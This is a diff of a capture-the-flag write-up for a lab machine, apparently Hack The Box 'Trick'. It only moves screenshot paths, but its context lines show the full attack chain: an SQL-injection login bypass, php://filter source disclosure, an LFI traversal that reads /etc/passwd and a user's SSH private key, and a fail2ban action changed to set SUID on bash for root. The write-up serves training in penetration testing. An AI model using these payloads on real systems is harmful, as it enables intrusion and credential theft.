@@ -42,7 +42,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.227.180
 ```
 
-![ICMP reply](trick_01_ping.png)
+![ICMP reply](screenshots/trick_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -60,7 +60,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.227.180 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![All TCP ports](trick_02_nmap_allports.png)
+![All TCP ports](screenshots/trick_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -68,7 +68,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![Extracted port list](trick_03_extractports.png)
+![Extracted port list](screenshots/trick_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -84,8 +84,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![Targeted scan (services)](trick_04_nmap_targeted_1.png)
-![Targeted scan (HTTP title)](trick_05_nmap_targeted_2.png)
+![Targeted scan (services)](screenshots/trick_04_nmap_targeted_1.png)
+![Targeted scan (HTTP title)](screenshots/trick_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -107,7 +107,7 @@ The version scan already pointed to a placeholder landing page. Fingerprinting c
 whatweb http://10.129.227.180
 ```
 
-![whatweb on IP](trick_06_whatweb.png)
+![whatweb on IP](screenshots/trick_06_whatweb.png)
 
 Map names locally. The zone lists `trick.htb` pointing at loopback; point these names at the **lab IP** in `/etc/hosts` for browsing:
 
@@ -116,7 +116,7 @@ Map names locally. The zone lists `trick.htb` pointing at loopback; point these 
 # 10.129.227.180 trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
 ```
 
-![Default HTTP landing](trick_07_http_coming_soon.png)
+![Default HTTP landing](screenshots/trick_07_http_coming_soon.png)
 
 ---
 ### 2.2 DNS Reverse Lookup and Zone Transfer
@@ -127,13 +127,13 @@ Port 53 runs authoritative BIND and does not offer recursion, so query **this** 
 dig @10.129.227.180 -x 10.129.227.180
 ```
 
-![PTR lookup](trick_08_dig_reverse.png)
+![PTR lookup](screenshots/trick_08_dig_reverse.png)
 
 ```bash
 dig @10.129.227.180 axfr trick.htb
 ```
 
-![Zone transfer](trick_09_dig_axfr.png)
+![Zone transfer](screenshots/trick_09_dig_axfr.png)
 
 Optional: confirm the reported BIND build via CHAOS TXT:
 
@@ -141,7 +141,7 @@ Optional: confirm the reported BIND build via CHAOS TXT:
 dig @10.129.227.180 version.bind CHAOS TXT
 ```
 
-![version.bind CHAOS TXT](trick_10_dig_version_bind.png)
+![version.bind CHAOS TXT](screenshots/trick_10_dig_version_bind.png)
 
 ---
 ### 2.3 Payroll vHost — Application Surface
@@ -152,7 +152,7 @@ After adding `preprod-payroll.trick.htb` to `/etc/hosts`, open the login page an
 # Browser: http://preprod-payroll.trick.htb/login.php
 ```
 
-![Payroll login](trick_11_payroll_login.png)
+![Payroll login](screenshots/trick_11_payroll_login.png)
 
 ---
 ### 2.4 Payroll vHost — Authentication Bypass
@@ -164,7 +164,7 @@ Default credentials did not work in this run. A **SQL injection–style login by
 # ' or 1=1-- -
 ```
 
-![Payroll admin dashboard](trick_12_payroll_admin_home.png)
+![Payroll admin dashboard](screenshots/trick_12_payroll_admin_home.png)
 
 ---
 ### 2.5 Payroll vHost — Source Disclosure via php://filter
@@ -178,7 +178,7 @@ Request the wrapped source in the browser:
 # http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=home
 ```
 
-![php://filter output for home (browser)](trick_13_php_filter_home_browser.png)
+![php://filter output for home (browser)](screenshots/trick_13_php_filter_home_browser.png)
 
 Decode the Base64 locally to inspect `home` (it includes `db_connect.php`):
 
@@ -186,7 +186,7 @@ Decode the Base64 locally to inspect `home` (it includes `db_connect.php`):
 echo '<BASE64_FROM_PAGE>' | base64 -d
 ```
 
-![Decoded home fragment (terminal)](trick_14_php_filter_home_decoded.png)
+![Decoded home fragment (terminal)](screenshots/trick_14_php_filter_home_decoded.png)
 
 Repeat for `db_connect`:
 
@@ -195,13 +195,13 @@ Repeat for `db_connect`:
 # http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect
 ```
 
-![php://filter output for db_connect (browser)](trick_15_php_filter_db_connect_browser.png)
+![php://filter output for db_connect (browser)](screenshots/trick_15_php_filter_db_connect_browser.png)
 
 ```bash
 echo '<BASE64_FROM_PAGE>' | base64 -d
 ```
 
-![Decoded db_connect (terminal)](trick_16_php_filter_db_connect_decoded.png)
+![Decoded db_connect (terminal)](screenshots/trick_16_php_filter_db_connect_decoded.png)
 
 **Recovered (sensitive):** MySQL user `remo`, database `payroll_db`, and password as shown in the decoded file (see local notes; redact in public writeups).
 
@@ -215,7 +215,7 @@ wfuzz -c --hw=475 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil
   -H "Host: preprod-FUZZ.trick.htb" http://trick.htb
 ```
 
-![wfuzz preprod-* hit](trick_17_wfuzz_marketing.png)
+![wfuzz preprod-* hit](screenshots/trick_17_wfuzz_marketing.png)
 
 The same wordlist run with a slightly different **`Host`** template also matched **`marketing`** in this engagement:
 
@@ -226,7 +226,7 @@ wfuzz -c --hw=475 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil
 
 After adding `preprod-marketing.trick.htb` to `/etc/hosts`, the site loads a template application; the `page` parameter is the primary pivot for LFI testing.
 
-![Marketing vhost home](trick_18_marketing_site_home.png)
+![Marketing vhost home](screenshots/trick_18_marketing_site_home.png)
 
 ---
 ### 2.7 Marketing vHost — LFI and `/etc/passwd`
@@ -238,7 +238,7 @@ The marketing site includes `page` with a **`../` sanitizer** that can be bypass
 # http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//etc/passwd
 ```
 
-![LFI /etc/passwd](trick_19_lfi_etc_passwd.png)
+![LFI /etc/passwd](screenshots/trick_19_lfi_etc_passwd.png)
 
 ---
 ### 2.8 Marketing vHost — SSH Private Key Exfiltration
@@ -250,7 +250,7 @@ Using the same primitive, read **`/home/michael/.ssh/id_rsa`** (adjust the numbe
 # http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....///home/michael/.ssh/id_rsa
 ```
 
-![Exfiltrated id_rsa (local)](trick_20_lfi_id_rsa.png)
+![Exfiltrated id_rsa (local)](screenshots/trick_20_lfi_id_rsa.png)
 
 If SSH prints `Load key "id_rsa": Permission denied`, the key file is often **root-owned** after an edit with `sudo`; assign ownership to your user and retry.
 
@@ -261,7 +261,7 @@ chmod 600 id_rsa
 ssh -i ./id_rsa michael@10.129.227.180
 ```
 
-![SSH session as michael](trick_21_ssh_michael.png)
+![SSH session as michael](screenshots/trick_21_ssh_michael.png)
 
 ---
 ## 3. Foothold
@@ -276,7 +276,7 @@ id
 cat ~/user.txt
 ```
 
-![User flag](trick_22_user_flag.png)
+![User flag](screenshots/trick_22_user_flag.png)
 
 🏁 **User flag obtained**
 
@@ -297,18 +297,18 @@ cp iptables-multiport.bak iptables-multiport.conf
 sudo nano /etc/fail2ban/action.d/iptables-multiport.conf
 ```
 
-![Editing fail2ban action with nano](trick_23_fail2ban_nano_iptables.png)
+![Editing fail2ban action with nano](screenshots/trick_23_fail2ban_nano_iptables.png)
 
 Set both **`actionban`** and **`actionunban`** to **`chmod u+s /bin/bash`** (or your chosen payload), save, then restart the service:
 
-![actionban / actionunban lines](trick_24_fail2ban_actionban_config.png)
+![actionban / actionunban lines](screenshots/trick_24_fail2ban_actionban_config.png)
 
 ```bash
 sudo /etc/init.d/fail2ban restart
 ls -la /bin/bash
 ```
 
-![After restart: bash permissions](trick_25_fail2ban_restart_bash_ls.png)
+![After restart: bash permissions](screenshots/trick_25_fail2ban_restart_bash_ls.png)
 
 From the attacker machine, generate several failed SSH logins as `michael` so fail2ban executes the ban action (example using `sshpass`; use your own lab-safe method if preferred):
 
@@ -318,11 +318,11 @@ seq 1 10 | xargs -P 50 -I{} sshpass -p 'wrongpassword' ssh \
   michael@10.129.227.180
 ```
 
-![Failed SSH attempts (ban trigger)](trick_26_failed_ssh_ban_trigger.png)
+![Failed SSH attempts (ban trigger)](screenshots/trick_26_failed_ssh_ban_trigger.png)
 
 After enough failures, `/bin/bash` should carry the **setuid** bit:
 
-![SUID bash](trick_27_suid_bash.png)
+![SUID bash](screenshots/trick_27_suid_bash.png)
 
 ---
 ### 4.2 Root Shell via SUID bash
@@ -335,7 +335,7 @@ whoami
 cat /root/root.txt
 ```
 
-![Root proof](trick_28_root_proof.png)
+![Root proof](screenshots/trick_28_root_proof.png)
 
 🏁 **Root flag obtained**
 
